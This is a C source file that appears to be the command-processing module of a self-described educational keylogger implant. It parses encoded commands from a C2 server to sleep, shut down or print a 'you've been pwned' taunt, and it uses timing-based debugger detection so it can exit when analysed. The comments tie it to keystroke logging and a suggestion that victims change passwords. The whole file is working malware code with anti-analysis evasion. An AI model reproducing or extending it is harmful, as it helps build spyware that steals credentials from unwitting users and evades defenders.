 
#include <string.h>

#include "commands.h"
#include "client.h"
#include "../program/program.h"

// private method prototypes
static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp);
static void doSleep(int n);
static void doPawn();
static int extractN(char* cmdStr);


/**
 * split the cmds based upon newline characters. Then execute each one sequentially.
 * NOTE: if we detect the commands were incorectly encoded its likely due to the C2
 * being spoofed, as such do not execute them! Furthermore, if we detect that a 
 * given command takes longer than 2.5s to execute then we are likely being debugged
 * so exit!
 * 
 * @param client the current client of the host machine
 * @return whether the commands successfully executed, or we need to shutdown, or 
 *      incorrect encoding key was detected, or a debugger was detected
 */
RET_CODE processCommands(CLIENT_HANDLER* client) {
    char* saveState;
    char* line = strtok_r(client->cmdBuffer, "\n", &saveState);

    LARGE_INTEGER start, end, freq;
    while (line != NULL) {
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&start);

        int slp = 0;
        RET_CODE ret = executeCommand(line, ctx->SECRET_KEY, &slp);

        QueryPerformanceCounter(&end);
        LONG elapsedTime = ((end.QuadPart - start.QuadPart) / freq.QuadPart) - slp;

        // if it longer than 2.5 seconds then exit
        if (elapsedTime > 2.5) { return R_DETECT; }

        // if shutdown, or the commands were incorrectly encoded then exit!
        if (ret == R_DO_SHUTDOWN)   { return R_DO_SHUTDOWN; }
        if (ret == R_INCORRECT_ENC) { return R_INCORRECT_ENC; }

        line = strtok_r(NULL, "\n", &saveState);
    }
    return R_SUCCESS;
}

/**
 * Takes a single command, match the given action and execute it by 
 * dispatching behaviour to required methods.
 * 
 * @param cmdStr the command to be exec'ed
 * @param key the encoding key to use
 * @param slp if we sleep then we need to account for that in the time-based
 *      debugger detection! This param keeps track of it
 * @return flag associated the commands execution
 */
static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp) {
    encode(cmdStr, &key);
    
    if (strncmp(cmdStr, "slp", 3) == 0) {
        ctx->sleeping = TRUE;

        // we want to record how long we've slept incase we are being debugged!
        *slp = extractN(cmdStr + 3);
        doSleep(*slp * 1000); // pass the milliseconds we want to sleep for

        ctx->sleeping = FALSE;
        return R_SUCCESS;
    } 
    if (strncmp(cmdStr, "shd", 3) == 0) {
        ctx->shutdown = TRUE;
        return R_DO_SHUTDOWN;
    } 
    if (strncmp(cmdStr, "pwn", 3) == 0) {
        doPawn();
        return R_SUCCESS;
    }
    
    return R_INCORRECT_ENC; 
}

/**
 * simply sleep for n seconds, this halts all threads because the mutex was aquired
 * before the remote commands could be executed! Furthermore, the sleeping flag was 
 * set earlier which prevents key presses fromo being logger
 * 
 * @param n number of milliseconds to sleep for
 */
static void doSleep(int n) {
    Sleep(n);
}

/**
 * simply prints a 'You've been pwned!' message
 */
static void doPawn() {
    printf("\nUnfortunately you been pwn'ed hehehe (educationally speaking :))!\n");
    printf("You may potentially want to change you password...\n\n");
}

/**
 * This method will only only return a +ve int when the slp command is given, otherwise it returns 0. 
 * It will simple skip an whitespaces and then return the number if it exists
 * 
 * @param cmdStr the remainder of the command that was provided
 * @return the number in the command if there was one
 */
static int extractN(char* cmdStr) {
    while (*cmdStr != '\0' && !isdigit(*cmdStr)) { cmdStr++; }  // skip non-digit chars

    if (isdigit(*cmdStr)) { // return the number if it exists
        return atoi(cmdStr);
    }
    return 0;
}
